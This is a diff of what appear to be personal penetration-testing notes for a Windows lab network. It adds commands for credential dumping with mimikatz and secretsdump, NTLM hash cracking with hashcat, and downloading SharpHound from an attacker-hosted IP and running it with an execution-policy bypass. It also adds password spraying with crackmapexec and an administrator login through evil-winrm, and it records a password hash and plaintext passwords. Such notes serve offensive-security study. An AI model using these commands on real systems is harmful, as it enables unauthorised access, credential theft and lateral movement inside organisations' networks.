@@ -74,6 +74,7 @@ lsadump::cache
 lsadump::secrets
 
 # mary.williams - 9a3121977ee93af56ebd0ef4f527a35e
+hashcat -m 1000 mary.williams.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 # look for SAM files
 %SYSTEMROOT%\repair\SAM  
@@ -96,6 +97,15 @@ impacket-secretsdump -sam sam -system system
 # look in command history - find a password we can use to password spray
 (Get-PSReadlineOption).HistorySavePath
 hghgib6vHT3bVWf
+
+# check out domain info
+upload SharpHound.ps1
+iwr -uri http://192.168.45.234/SharpHound.ps1 -Outfile SharpHound.ps1
+powershell -ep bypass
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All
+Invoke-BloodHound -LDAPUser support -LDAPPAss Freedom1 -CollectionMethod All -OutputDirectory C:\users\administrator
+
 ```
 
 enumerate internal network
@@ -122,11 +132,8 @@ upload agent.exe
 nmap -Pn 10.10.110.154
 sudo nmap -sU --open -p 161 -Pn 10.10.110.154
 
-crackmapexec smb 10.10.110.154 -u web_svc -p 'hghgib6vHT3bVWf' --continue-on-success
-crackmapexec winrm 10.10.110.154 -u web_svc -p 'hghgib6vHT3bVWf' --continue-on-success --local-auth
-crowbar -b rdp -s 10.10.110.154/32 -u web_svc -c "hghgib6vHT3bVWf" -n 1
-impacket-mssqlclient web_svc:hghgib6vHT3bVWf@10.10.110.154 -windows-auth
-impacket-psexec web_svc:hghgib6vHT3bVWf@10.10.110.154
+crackmapexec smb 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth
+crackmapexec winrm 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth --local-auth
 
-evil-winrm -i 10.10.110.154 -u web_svc -p "hghgib6vHT3bVWf"
+evil-winrm -i 10.10.110.154 -u administrator -p hghgib6vHT3bVWf
 ```
